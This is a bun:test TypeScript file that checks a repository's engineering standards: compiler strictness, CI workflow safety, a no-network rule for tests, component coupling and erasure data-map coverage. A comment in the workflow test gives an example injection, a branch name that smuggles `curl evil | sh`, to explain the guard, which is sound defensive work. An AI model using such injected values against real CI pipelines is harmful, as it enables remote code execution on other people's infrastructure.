import { expect, test } from "bun:test";

/**
 * Engineering_Standards.txt:30-60 — "this is the floor, not a starting point for negotiation".
 * Loosening the config is a rollback of the standard, so it fails a test rather than passing
 * silently in a pull request nobody reads closely.
 */
const REQUIRED_COMPILER_OPTIONS: Readonly<Record<string, boolean | string>> = {
  strict: true,
  noUncheckedIndexedAccess: true,
  exactOptionalPropertyTypes: true,
  noPropertyAccessFromIndexSignature: true,
  noImplicitReturns: true,
  noImplicitOverride: true,
  noFallthroughCasesInSwitch: true,
  noUnusedLocals: true,
  noUnusedParameters: true,
  allowUnreachableCode: false,
  allowUnusedLabels: false,
  verbatimModuleSyntax: true,
  isolatedModules: true,
  noUncheckedSideEffectImports: true,
  moduleDetection: "force",
  forceConsistentCasingInFileNames: true,
  erasableSyntaxOnly: true,
  declaration: true,
  declarationMap: true,
  sourceMap: true,
  skipLibCheck: true,
};

/** Parse boundary: JSON arrives as `unknown` and is narrowed once, here. */
function readProperty(source: object, name: string): unknown {
  const descriptor: PropertyDescriptor | undefined = Object.getOwnPropertyDescriptor(source, name);
  return descriptor === undefined ? undefined : descriptor.value;
}

function readCompilerOptions(parsed: unknown): object {
  if (typeof parsed !== "object" || parsed === null) {
    throw new Error("tsconfig.json did not parse to an object");
  }
  const options = readProperty(parsed, "compilerOptions");
  if (typeof options !== "object" || options === null) {
    throw new Error("tsconfig.json has no compilerOptions object");
  }
  return options;
}

/**
 * `tsconfig.json` is JSONC — TypeScript accepts comments in it, and this one carries the reason the
 * strict block may not be loosened, which is worth more in the file than in a doc nobody opens
 * next to it. `Bun.file().json()` is strict JSON and rejects those comments, so the test reads the
 * file the way the compiler does.
 *
 * String-aware rather than a bare `//` regex: a `//` inside a string value is data, and a stripper
 * that does not know the difference corrupts the config it is trying to read.
 */
function stripJsonComments(source: string): string {
  // One pass, three alternatives in order: a double-quoted string with escapes, a line comment, a
  // block comment. Strings match first and are returned verbatim, so a `//` inside a value stays
  // data. Written as a single regular expression rather than a character loop because
  // `noUncheckedIndexedAccess` — the very flag this test guards — types every `source[i]` as
  // `string | undefined`, and a loop that fights the strictness it is verifying is the wrong shape.
  return source.replace(
    /("(?:\\.|[^"\\])*")|\/\/[^\n]*|\/\*[\s\S]*?\*\//g,
    (_match, str: string | undefined) => str ?? "",
  );
}

test("tsconfig.json declares every mandated compiler option", async () => {
  const raw = await Bun.file(new URL("../tsconfig.json", import.meta.url)).text();
  const parsed: unknown = JSON.parse(stripJsonComments(raw));
  const compilerOptions = readCompilerOptions(parsed);

  for (const [option, expected] of Object.entries(REQUIRED_COMPILER_OPTIONS)) {
    expect([option, readProperty(compilerOptions, option)]).toEqual([option, expected]);
  }
});

/**
 * Repo-configuration invariants. Each of these guards a failure that actually happened, and each
 * was invisible until something downstream broke — which is why they live in a test rather than in
 * a comment somebody has to remember to read.
 */

async function readRepoFile(relative: string): Promise<string> {
  return Bun.file(new URL(`../${relative}`, import.meta.url)).text();
}

test("no workflow splices an expression into a shell script", async () => {
  // `${{ github.event.pull_request.head.ref }}` inside a `run:` block is substituted before the
  // shell parses the line, so a branch named `x"; curl evil | sh; #` executes. This repo is public,
  // so anyone can open a PR and choose that name. Passing the value through `env:` makes it one
  // argument whatever it contains.
  //
  // Walks indentation rather than matching the block with one regular expression. The obvious
  // pattern — `run: \|[\s\S]*?(?=...|$)` — is silently vacuous: under the `m` flag `$` matches at
  // the end of *every* line, so the lazy quantifier stops immediately and the guard inspects the
  // string "run: |" and nothing else. It passed a planted injection before this was rewritten,
  // which is LD-11's point about proving a gate against the shape it actually guards.
  // `dot: true` is load-bearing: Bun.Glob.scan skips dot-directories by default, so without it the
  // scan never enters `.github/` and yields nothing. The guard passed a planted injection twice
  // before this flag was added — once for the regex above, once for this.
  const workflows: string[] = [];
  for await (const path of new Bun.Glob(".github/workflows/*.yml").scan({ cwd: ".", dot: true })) {
    workflows.push(path);
  }
  expect(workflows.length).toBeGreaterThan(0);

  const offenders: string[] = [];
  for (const path of workflows) {
    const lines = (await readRepoFile(path)).split("\n");
    let blockIndent: number | undefined;
    for (const line of lines) {
      const indent = line.length - line.trimStart().length;
      if (blockIndent !== undefined && line.trim() !== "" && indent <= blockIndent) {
        blockIndent = undefined;
      }
      if (blockIndent !== undefined && line.includes("${{")) {
        offenders.push(`${path}: ${line.trim()}`);
      }
      if (/^ *run: \|/.test(line)) {
        blockIndent = indent;
      }
    }
  }
  expect(offenders).toEqual([]);
});

test("CI runs on every pull request, not only those targeting main", async () => {
  const workflow = await readRepoFile(".github/workflows/ci.yml");
  const afterTrigger = workflow.slice(workflow.indexOf("pull_request:") + "pull_request:".length);
  const nextDirective = afterTrigger.split("\n").find((line) => line.trim().length > 0) ?? "";

  // Stage branches are stacked, so a PR often targets another stage. A branch filter here left
  // four stacked PRs with no checks at all — they looked mergeable while never having been run.
  expect(nextDirective).not.toContain("branches:");
});

test("no test reaches the network", async () => {
  // Keyed on the calls that perform I/O, not on URL literals.
  //
  // It used to forbid any `http(s)://` in a test file. That caught the incident it was written for —
  // a test that navigated a browser to example.com — and also forbade testing any code that handles
  // a URL, which is most of an SSRF defence. A gate that stands between the repo and the tests most
  // worth having is one people route around, so it now looks for the verbs that actually reach the
  // network. A URL sitting in a table of things a pure function must refuse performs nothing.
  const NETWORK_CALLS = /\b(fetch|WebSocket|Bun\.connect|\.navigate)\s*\(/;
  const LOCAL_ONLY = /^(https?:\/\/)?(127\.0\.0\.1|localhost|\[::1\])/;

  const offenders: string[] = [];
  for await (const path of new Bun.Glob("tests/**/*.ts").scan(".")) {
    const source = await readRepoFile(path);
    if (!NETWORK_CALLS.test(source)) {
      continue;
    }
    const remote = [...source.matchAll(/https?:\/\/[^"'`\s)]+/g)]
      .map(([url]) => url)
      .filter((url) => !LOCAL_ONLY.test(url));
    if (remote.length > 0) {
      offenders.push(`${path} -> ${String(remote[0])}`);
    }
  }

  // A flaky network dependency inside a blocking gate is worse than no gate: a gate that never
  // fires is false assurance, but one that fires at random trains people to click through red CI,
  // which costs the credibility of every gate beside it.
  expect(offenders).toEqual([]);
});

test("the job main is protected on is still called test", async () => {
  const workflow = await readRepoFile(".github/workflows/ci.yml");

  // Branch protection requires a status check named "test", matched by string. Rename the job and
  // every merge blocks forever waiting for a check that will never report — it fails closed, which
  // is the right direction and an afternoon to diagnose. The coupling is invisible from either side
  // on its own, so it is pinned from the side that lives in the repo.
  expect(workflow).toContain("\n  test:\n");

  // And the stacked-PR guard lives in that job, so it cannot be skipped by moving it elsewhere.
  const testJob = workflow.slice(
    workflow.indexOf("\n  test:\n"),
    workflow.indexOf("\n  sandbox:\n"),
  );
  expect(testJob).toContain("Refuse to merge a branch another PR is stacked on");
});

test("nothing that needs a container runs in the merge-blocking suite", async () => {
  const manifest: unknown = await Bun.file(new URL("../package.json", import.meta.url)).json();
  const scripts = readProperty(
    typeof manifest === "object" && manifest !== null ? manifest : {},
    "scripts",
  );
  const testScript = readProperty(
    typeof scripts === "object" && scripts !== null ? scripts : {},
    "test",
  );

  // `bun run test` is what CI blocks a merge on. Container tests pull images over the network, and
  // a network dependency in a blocking position is the flaky gate LD-10 warns about — the one that
  // teaches people to click through red CI.
  expect(String(testScript)).toContain("sandbox");

  const offenders: string[] = [];
  for await (const path of new Bun.Glob("tests/**/*.ts").scan(".")) {
    // This file names those classes in order to look for them, so it matches itself.
    if (path.startsWith("tests/sandbox/") || path === "tests/standards.test.ts") {
      continue;
    }
    const source = await readRepoFile(path);
    if (/"docker"|DockerCodeExecutor|DockerBrowserTool/.test(source)) {
      offenders.push(path);
    }
  }

  // And the separation cannot drift: a container test written in the wrong folder fails here rather
  // than quietly rejoining the blocking path.
  expect(offenders).toEqual([]);
});

test("the TypeScript pin is ignored under the ecosystem that owns it", async () => {
  const dependabot = await readRepoFile(".github/dependabot.yml");
  const blocks = dependabot.split("- package-ecosystem:");
  const bunBlock = blocks.find((block) => block.trimStart().startsWith('"bun"')) ?? "";

  // LD-5 pins TypeScript to 6.x. An ignore filed under the wrong ecosystem parses fine and does
  // nothing at all, which is how a considered decision gets quietly reversed by a bot.
  expect(bunBlock).toContain("typescript");
  expect(bunBlock).toContain("7.x");
});

test("the layering gate sees type-only imports", async () => {
  const config = await Bun.file(".dependency-cruiser.cjs").text();

  // Without this, dependency-cruiser cruises transpiled output where `import type` is already gone.
  // Under verbatimModuleSyntax most cross-package imports in `domain` are type-only, so the
  // layering rules passed clean for the whole build while never inspecting them. Three real
  // violations surfaced the moment it was turned on.
  expect(config).toContain("tsPreCompilationDeps: true");
});

/**
 * Which component may depend on which. This table *is* the coupling graph — there is nowhere else
 * it is written down.
 *
 * It used to live across 27 `package.json` manifests, and it was never enforced there. Under Bun's
 * isolated linker `packages/<name>/node_modules` really did hold only that package's declared deps,
 * but module resolution walks *upward*, and the root `node_modules` held all 27 because LD-3 needs
 * them in the root `devDependencies` for `tests/` to import. Two sound decisions, one hole between
 * them: `gateway/infrastructure` importing `@custodian/oversight`, absent from gateway's manifest,
 * passed tsc, dependency-cruiser, knip and ESLint together, and ran.
 *
 * dependency-cruiser catches the `domain` case only because a *layering* rule fires there by
 * coincidence; a workspace import reaches it as `dependencyTypes: unknown`, which is the documented
 * reason `.dependency-cruiser.cjs` keys on paths at all.
 *
 * So the manifests were documentation that could drift from the truth in silence. This table cannot:
 * it is checked in both directions, so an undeclared import fails, and an entry nothing imports any
 * more fails too rather than rotting into a permission nobody meant to grant.
 */
const COMPONENT_DEPENDENCIES: Readonly<Record<string, readonly string[]>> = {
  agent: ["custody", "evidence", "governance", "knowledge", "primitives", "serving"],
  custody: ["primitives"],
  evidence: ["custody", "primitives"],
  governance: ["primitives"],
  knowledge: ["custody", "primitives"],
  primitives: [],
  serving: ["custody", "evidence", "governance", "knowledge", "primitives"],
  surfaces: ["primitives"],
};

async function importsByComponent(): Promise<Map<string, Set<string>>> {
  const pattern = /from\s+"@custodian\/([a-z-]+)"/g;
  const found = new Map<string, Set<string>>();

  for await (const path of new Bun.Glob("src/*/**/*.ts").scan(".")) {
    const component = path.split("/")[1] ?? "";
    const text = await readRepoFile(path);
    for (const [, imported] of text.matchAll(pattern)) {
      if (imported !== undefined && imported !== component) {
        const existing = found.get(component) ?? new Set<string>();
        existing.add(imported);
        found.set(component, existing);
      }
    }
  }
  return found;
}

test("the component list matches the components on disk", async () => {
  const onDisk: string[] = [];
  for await (const path of new Bun.Glob("src/*/index.ts").scan(".")) {
    onDisk.push(path.split("/")[1] ?? "");
  }

  // A component with no entry would be silently exempt from the rule below, which is the failure
  // mode of every allowlist that is not itself checked against reality.
  expect(onDisk.sort()).toEqual(Object.keys(COMPONENT_DEPENDENCIES).sort());
});

test("no component imports another it has not declared", async () => {
  const actual = await importsByComponent();
  const undeclared: string[] = [];

  for (const [component, imports] of actual) {
    const declared = new Set(COMPONENT_DEPENDENCIES[component] ?? []);
    for (const imported of imports) {
      if (!declared.has(imported)) {
        undeclared.push(`${component} → ${imported}`);
      }
    }
  }

  expect(undeclared.sort()).toEqual([]);
});

test("no component declares a dependency it does not use", async () => {
  const actual = await importsByComponent();
  const unused: string[] = [];

  for (const [component, declared] of Object.entries(COMPONENT_DEPENDENCIES)) {
    const imports = actual.get(component) ?? new Set<string>();
    for (const dependency of declared) {
      if (!imports.has(dependency)) {
        unused.push(`${component} → ${dependency}`);
      }
    }
  }

  // Without this half the table only ever grows, and a stale entry is a standing permission to
  // couple two components that no longer have anything to do with each other.
  expect(unused.sort()).toEqual([]);
});

/**
 * Every durable store has a location in the erasure data map.
 *
 * `runErasure` checks that a request covers every location in `DATA_MAP`, which catches a request
 * that forgot one — and can never catch a location missing from the map itself. That is not
 * hypothetical: `SqliteDeletionRegistry` shipped writing a subject identifier to disk, with no
 * DATA_MAP entry, no retention class and no way to remove a row, and every gate passed.
 *
 * So the map is diffed against the durable stores that actually exist. A new `Sqlite*` adapter has
 * to be classified here before the build goes green, which is the moment someone is actually
 * thinking about where its rows go.
 */
const DURABLE_STORE_LOCATIONS: Readonly<Record<string, string>> = {
  SqliteExecutionLogStore: "execution-log",
  SqliteIdempotencyStore: "idempotency-store",
  SqliteDeletionRegistry: "deletion-registry",
  SqliteVectorIndex: "vector-index",
  SqliteApprovalGate: "approval-queue",
  WriteFileTool: "agent-workspace",
  ReadFileTool: "agent-workspace",
};

/**
 * How a class is recognised as persisting something. Keyed on the mechanism rather than on a
 * `Sqlite` naming convention, which is what the previous version of this guard matched: it read
 * `export class (Sqlite\w+)`, so the agent's file tools — a durable store built on `Bun.write` —
 * were not merely unclassified but invisible, and the guard reported clean while a location sat
 * outside the erasure data map. LD-11 is the general form: a gate is not enforcing until a
 * violation of the shape it actually guards has failed it, and the shape here is persistence, not
 * a prefix.
 */
const PERSISTENCE_MECHANISMS = /new Database\(|Bun\.write\(/;

test("every durable store is classified in the erasure data map", async () => {
  const dataMap = await readRepoFile("src/custody/domain/erasure-workflow.ts");
  const declared = new Set(
    [...dataMap.matchAll(/^\s*"([a-z-]+)",$/gm)].map(([, location]) => location),
  );

  const unclassified: string[] = [];
  for await (const path of new Bun.Glob("src/*/infrastructure/*.ts").scan(".")) {
    const source = await readRepoFile(path);
    if (!PERSISTENCE_MECHANISMS.test(source)) {
      continue;
    }
    for (const [, name] of source.matchAll(/export class (\w+)/g)) {
      if (name === undefined) {
        continue;
      }
      const location = DURABLE_STORE_LOCATIONS[name];
      if (location === undefined || !declared.has(location)) {
        unclassified.push(`${name} (${path})`);
      }
    }
  }

  expect(unclassified).toEqual([]);
});

test("no subject key store holds its own keys", async () => {
  const offenders: string[] = [];
  for await (const path of new Bun.Glob("src/**/*.ts").scan(".")) {
    const source = await readRepoFile(path);
    if (/implements SubjectKeyStore/.test(source) && !/KeyCustodian/.test(source)) {
      offenders.push(path);
    }
  }

  // The deleted AesGcmSubjectKeyStore generated and held its own keys, so a restart was an Article
  // 17 erasure of every subject at once. Reintroducing that shape looks like a helpful test double
  // right up to the moment it is composed in main.ts, and nothing else would catch it.
  expect(offenders).toEqual([]);
});

test("the vector index stores sealed embeddings, never bare vectors", async () => {
  const source = await readRepoFile("src/knowledge/infrastructure/in-memory-vector-index.ts");

  // Scoped to the stored type, not the whole file. `sealEmbedding` legitimately *takes* a bare
  // vector — it is the thing being sealed — so a file-wide match would fail on correct code, and a
  // gate that fires on the right file for the wrong reason teaches people to edit the gate.
  const declaration = source.slice(
    source.indexOf("export type IndexedDocument"),
    source.indexOf("};", source.indexOf("export type IndexedDocument")),
  );

  // The data map gives the vector index exactly one erasure mechanism: key destruction, because
  // "soft delete is insufficient" (Data_Protection_and_Retention.txt:49-50). A bare number[] here
  // is a fragment that survives erasure, which is precisely what the release gate exists to fail.
  expect(declaration).toContain("readonly embedding: SealedContent");
  expect(declaration).not.toMatch(/readonly embedding:\s*readonly number\[\]/);
});

test("type assertions are exempt in exactly the two pinned source files", async () => {
  const config = await Bun.file("eslint.config.js").text();
  const block = config.slice(config.indexOf("Two exceptions the standard names"));
  const exempt = [...block.slice(0, block.indexOf("],")).matchAll(/"(src\/[^"]+)"/g)];

  // A path list of individual parsers used to hold this exemption, and six files silently lost it
  // by moving one folder deeper. Every brand is now built through `brand()`, so the list is one
  // entry — and growing it back is a decision someone has to make in this test first.
  expect(exempt.map((m) => m[1])).toEqual([
    "src/primitives/domain/language/brand.ts",
    // A single-purpose row parser whose one assertion is hash-verified before anything returns —
    // a parser exemption in the standard's own sense, made deliberately here (LD-11: growing this
    // list is a decision, not a drive-by), and scoped to the parser file so the sqlite adapter
    // itself stays under the assertion ban.
    "src/evidence/infrastructure/parse-stored-entry.ts",
  ]);
});
